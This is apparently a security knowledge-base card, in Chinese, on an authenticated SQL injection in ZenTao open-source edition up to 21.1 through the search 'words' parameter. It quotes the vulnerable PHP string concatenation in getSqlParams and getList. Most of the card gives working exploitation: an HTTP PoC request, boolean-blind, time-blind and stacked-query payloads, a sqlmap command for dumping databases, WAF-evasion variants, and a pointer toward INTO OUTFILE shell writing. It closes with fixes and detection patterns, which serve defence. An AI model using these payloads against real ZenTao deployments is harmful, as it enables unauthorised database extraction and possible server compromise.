---
id: web-generic-sqli-zentao-search-words-against-like
title: 禅道开源版搜索 words 参数：getSqlParams 直接拼进 AGAINST() 与 LIKE 双条件导致前台 SQL 注入
type: scenario
domain: web
path: web/generic/sqli
technique: zentao-search-words-against-like-concat
aliases:
- 禅道 SQL 注入
- ZenTao search SQL 注入
- words 参数注入
- getSqlParams 拼接注入
- AGAINST 布尔模式拼接
- 禅道 21.1 SQL 注入
- m=search&f=index 注入
tags:
- php
- zentao
- mysql
- sqli
- like-concat
- fulltext-against
- time-blind
- boolean-blind
- search-endpoint
cve: []
severity: high
confidence: high
affected_versions: <= 21.1
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W2
  verified_at: '2026-11-08T12:33:32+08:00'
  notes: 已对照原文核对：module/search/control.php 传 words 到 model.php getList 的 scoreColumn/where 拼接 AGAINST 与 likeCondition、再到 tao.php getSqlParams 的 against/againstCond/likeCondition，与原文源码截图逐行一致；words 单引号触发 SQLSTATE[42000] 1064 并回显完整 SQL（含 AGAINST 与 like 拼接痕迹）、sqlmap 输出布尔/堆叠/时间三类注入点与 MySQL/PHP 指纹，均与原文一致；已按原文影响版本设置为 <= 21.1。卡内已如实标注堆叠注入未单独验证、未打通写文件；未复跑任何请求
---

## 一句话结论

禅道开源版前台搜索（`m=search&f=index`）把用户输入的 `words` 原样交给 `searchTao::getSqlParams()`，该函数既把每个词拼进 `MATCH(title,content) AGAINST('...' IN BOOLEAN MODE)` 的 `$againstCond`，又把整串 `words` 拼进 `OR title like '%...%' OR content like '%...%'` 的 `$likeCondition`，两处都没有转义，因此一个单引号即可闭合字符串并注入；由于注入点在 `WHERE` 条件里，布尔/时间盲注可直接拖库。

## 原理

- 路由：`index.php?m=search&f=index&words=<payload>&type=all`。控制器 `module/search/control.php` 的 `index()` 把 `$words` 原样传给 `$this->search->getList($words, $type, $pager)`。
- `module/search/model.php` 的 `getList()` 开头调用 `list($words, $againstCond, $likeCondition) = $this->searchTao->getSqlParams($keywords);`，随后把两者直接插进查询构造器：
  ```php
  $scoreColumn = "(MATCH(title, content) AGAINST('{$againstCond}' IN BOOLEAN MODE))";
  $stmt = $this->dao->select("*, {$scoreColumn} as score")
      ->from(TABLE_SEARCHINDEX)
      ->where("(MATCH(title,content) AGAINST('{$againstCond}' IN BOOLEAN MODE) >= 1 {$likeCondition})")
      ->andWhere('vision')->eq($this->config->vision)
      ->andWhere('objectType')->in($allowedObjects)
      ...
  ```
  `dao->where()` 接收的是**已经拼好的 SQL 片段**（不是值参数），所以 `$againstCond`、`$likeCondition` 里的引号不会被框架转义。
- `module/search/tao.php` 的 `getSqlParams()` 是产生注入串的地方：
  ```php
  $words = explode(' ', $this->unify($keywords, ' '));
  foreach($words as $word) {
      $splitedWords = $spliter->utf8Split($word);
      $trimmedWord  = trim($splitedWords['words']);
      $against     .= "'" . $trimmedWord . "'";
      $againstCond .= "(+" . $trimmedWord . ")";
  }
  $likeCondition = trim($keywords) ? "OR title like '%{$keywords}%' OR content like '%{$keywords}%'" : '';
  ```
  两个分支都没有 `escape`/`addslashes`/白名单。
- 为什么两种拼法都会注入：
  - `$likeCondition` 用 `'%{$keywords}%'`，单引号 `'` 直接把 `LIKE '%` 之后的字符串闭合，余下部分按 SQL 语法执行。这是最直接、也最容易观察的一处。
  - `$againstCond` 先 `explode(' ')` 拆词，再把每个词包进 `(+word)`；`AGAINST('...' IN BOOLEAN MODE)` 的外层引号同样用单引号，因此词里出现 `'` 也能闭合 AGAINST 的字符串，把 `) IN BOOLEAN MODE` 之后的语法替换掉。注意 `+`/`-`/`"`/`*` 等布尔模式运算符本身也在引号内，闭合前它们不影响 SQL 层。
  - 两处注入点在同一条 SQL 里，任一闭合都能改变整条语句；`$keywords` 还会绕一圈进 `$against`/`$againstCond`，所以同一 payload 往往在两条条件上各被执行一次。
- 单引号直接触发数据库报错（`SQLSTATE[42000] Syntax error ... near '...'`），说明 `words` 未经 `real_escape_string` 或参数绑定。报错信息里带完整 SQL，可用来确定列数、条件位置，再转布尔/时间盲注。
- 前置权限：搜索页默认对已登录会话开放；原文验证环境是登录后的 search tab（携带 `zentaosid`）。未见未授权直接注入的确证，故按“任意已登录低权限账号”标注。

## 触发条件

- 目标为禅道开源版 ≤ 21.1，`module/search/tao.php::getSqlParams()` 未对 `$keywords`/`$word` 做转义。
- 攻击者持有任意可登录账号（前台搜索入口在登录态下使用；未验证匿名可达）。
- 数据库为 MySQL/MariaDB（`MATCH ... AGAINST` 为 FULLTEXT 语法；其它库需改写 payload）。
- 搜索索引表 `zt_searchindex` 存在且 `$this->config->vision` 与当前 vision 匹配，SQL 才会走到注入条件。
- 目标未在网关层对 `words` 做引号/关键字拦截（原文环境有 WAF 提示，sqlmap 仍命中，说明默认规则可绕）。

## 利用步骤

1. 登录禅道，抓取搜索请求，确认参数为 `words`，请求形如 `GET /index.php?m=search&f=index&words=1&type=all&zin=1`（`zin=1` 表示 AJAX 搜索，响应为精简 JSON/HTML，便于盲注判读）。
2. 基线：正常关键词，记录响应长度/时间。
3. 探测：`words=1'` 观察是否返回 1064 语法错误（`SQLSTATE[42000]`）并回显完整 SQL —— 有回显即确认。
4. 布尔盲注：`words=1' AND (SELECT 1 FROM (SELECT COUNT(*) FROM information_schema.tables) x)>0 AND '1'='1` 之类，配合 `type=all`，按“有结果/无结果”或响应长度差异判真。
5. 时间盲注：`words=1' AND (SELECT SLEEP(3)) AND '1'='1`（也可放进 `AGAINST` 分支），对比基线响应时间。
6. 用 sqlmap 直接打原始请求文件（`words=1*`，`--dbms=mysql --level=5 --risk=3`），原文实测命中 boolean-blind、time-based blind 与 stacked queries 三类 injection point，`--dbs` 成功列出数据库。
7. 之后按常规 MySQL 注入取表/列/数据；若能堆叠且具备 FILE 权限，可考虑 `INTO OUTFILE`（另见写 shell 卡片）。

## PoC

报错探测（最小）：

```http
GET /index.php?m=search&f=index&words=1'&type=all&zin=1 HTTP/1.1
Host: target
Cookie: zentaosid=<session>; lang=zh-cn; vision=rnd
X-Requested-With: XMLHttpRequest
```

预期：页面返回 MySQL 语法错误，错误详情中可见 `... AGAINST('(+1') IN BOOLEAN MODE)...` 与 `OR title like '%1'%'...` 的拼接痕迹。

时间盲注（sqlmap 抓到的可用形态之一）：

```text
words=1' AND (SELECT 3651 FROM (SELECT(SLEEP(5))ujTZ))-- -
```

布尔盲注形态：

```text
words=1' AND 3130=(SELECT (CASE WHEN (3130=3130) THEN 3130 ELSE (SELECT 9391 UNION SELECT 8570) END))-- -
```

堆叠（需驱动允许，PDO MySQL 默认 `multi_query` 关闭时不一定生效，原文 sqlmap 报告存在但未单独验证）：

```text
words=1');SELECT SLEEP(5)#
```

无 PoC 的部分：原文未给出写文件/读文件的实际验证，本卡不声称已打通。

## 变体与关联

- 变体：`$againstCond` 分支的闭合。把 payload 放在单词内且不依赖空格拆分，例如 `words=a')AND(SELECT SLEEP(3))AND('` ，可绕开对 `$likeCondition` 的单独规则，或在 WAF 只匹配 `like` 关键字时仍有注入点。
- 变体：`words` 含空格会被 `explode(' ')` 拆成多词，`$againstCond` 变成 `(+a)(+b)`；时间盲注需让可执行部分落在单个词内，或改用 `%09`/`/**/` 之类不触发拆分的空白替代。
- 变体：`type` 参数决定 `$allowedObjects`/`$filterObjects`，某些 `type` 值会改变 `WHERE` 的分支结构，可用来把注入点移到更容易判读的位置。
- 关联：[[web-generic-sqli-php-like-double-quote-union-outfile]]（同一“搜索接口 LIKE '%$word%' 直拼”的家族）；[[web-generic-sqli-like-clause-append-search]]（LIKE 拼接通用形态）。
- 关联：[[web-generic-sqli-error-based-extraction]]、[[web-generic-sqli-blind-filter-bypass-functions]]、[[web-generic-sqli-mysql-union-load-file-read]]（确认注入后的取数/读文件手法）。
- 关联：[[web-generic-sqli-second-order-injection]]（若把恶意 `words` 写入搜索历史/session 后再拼接，可形成二阶）。
- 边界：需要登录会话；`zt_searchindex` 需有可匹配记录，否则 `MATCH ... >= 1` 可能直接返回空集，让布尔判读失真。

## 检测与防御

- 修复：升级禅道到 21.1 之后的修复版本；或直接改 `getSqlParams()`，对每个 `$word` 与 `$keywords` 使用 `$this->dao->escape()`/PDO 绑定，`$againstCond` 只允许字母数字与布尔运算符白名单。
- 代码级：`dao->where()` 应传值而不是拼好的片段；FULLTEXT 查询同样可用参数绑定（`AGAINST(:kw IN BOOLEAN MODE)`），不要因为“是全文本就特殊”而绕过转义。
- 加固：对 `words` 限制长度、字符集，拒绝引号/反斜杠/注释符；对 `AGAINST` 的布尔运算符（`+ - " * ( )`）做白名单过滤，避免闭合后语法逃逸。
- 检测：审计 PHP 中 `"AGAINST('{$...}'"`、`"like '%{$...}%'"`、`where("... {$var} ...")` 等模式；日志中对 `words` 出现 `'`、`)`、`SLEEP`、`CASE`、`information_schema` 的请求告警；监控搜索接口单 IP 高频等长请求（盲注特征）。
- 通用原则：全文本查询的“字符串字面量”仍是 SQL 字符串字面量，必须按值处理；把多个词拼成条件时不要丢掉转义。
